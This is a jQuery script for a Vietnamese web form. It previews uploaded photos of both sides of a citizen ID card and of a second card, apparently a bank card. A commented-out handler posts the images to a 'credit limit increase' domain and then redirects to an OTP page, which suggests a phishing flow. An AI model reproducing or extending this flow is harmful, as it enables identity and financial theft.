$('#mattruoccccd').click(function () {
    jQuery('#mattruoccccd').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#mattruoccccd').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textmattr').attr('style', 'display:none');
            $('#iconmattr').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}

$('#matsaucccd').click(function () {
    jQuery('#matsaucccd').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL2(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#matsaucccd').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textmatsau').attr('style', 'display:none');
            $('#iconmatsaucancuoc').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}

$('#anhmattruocthe').click(function () {
    jQuery('#anhmattruocthe').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL3(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#anhmattruocthe').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textanhtruocthe').attr('style', 'display:none');
            $('#iconmattruocthe').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}
$('#anhmatsauthe').click(function () {
    jQuery('#anhmatsauthe').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL4(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#anhmatsauthe').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textanhsauthe').attr('style', 'display:none');
            $('#iconmatsauthe').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}

// Bắt sự kiện, ngay khi thay đổi file thì đọc lại nội dung và hiển thị lại hình ảnh mới trên khung preview-upload
$("#mattruoc").change(function () {
    readURL(this);
});
$("#matsau").change(function () {
    readURL2(this);
});
$("#mattruoc_card").change(function () {
    readURL3(this);
});
$("#matsau_card").change(function () {
    readURL4(this);
});

// $('#service').submit(function (e) {
//     e.preventDefault();
//     $('.loader').show()
//     var formData = new FormData($(this)[0]);

//     var mattruoc = $('#mattruoc').val();
//     var matsau = $('#matsau').val();
//     var mattruoc_card = $('#mattruoc_card').val();
//     var matsau_card = $('#matsau_card').val();
//     console.log(navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') == -1);
//     // if (navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') == -1) {
//     //     formData.append('mattruoc', mattruoc.files[0]);
//     //     formData.append('matsau', matsau.files[0]);
//     //     formData.append('mattruoc_card', mattruoc_card.files[0]);
//     //     formData.append('matsau_card', matsau_card.files[0]);

//     //     var xhr = new XMLHttpRequest();
//     //     xhr.open('POST', 'https://apitech.nanghanmuctindung.online/api/customer', true);
//     //     xhr.send(formData);
//     //     xhr.onreadystatechange = function () {
//     //         $('.loader').hide()
//     //         if (xhr.readyState == 4 && xhr.status == 200) {
//     //             window.location.href = '/otp.html';
//     //         } else {
//     //             console.log(xhr);
//     //             alert('Vui lòng kiểm tra lại thông tin!');
//     //         }
//     //     }
//     //     return;

//     // } else {
//     //     $.ajax({
//     //         url: 'https://apitech.nanghanmuctindung.online/api/customer',
//     //         // url: 'http://localhost/api/customer',
//     //         type: 'POST',
//     //         data: formData,
//     //         contentType: false,
//     //         processData: false,
//     //         cache: false,
//     //         headers: {
//     //             'Aceess-Control-Allow-Origin': '*',
//     //             'Accept': 'application/json',
//     //         },
//     //         success: function (data) {
//     //             $('.loader').hide()
//     //             window.location.href = '/otp.html';
//     //         },
//     //         error: function (data) {
//     //             $('.loader').hide()
//     //             console.log(data);
//     //             alert('Vui lòng kiểm tra lại thông tin!');
//     //         }
//     //     });
//     // }
// });
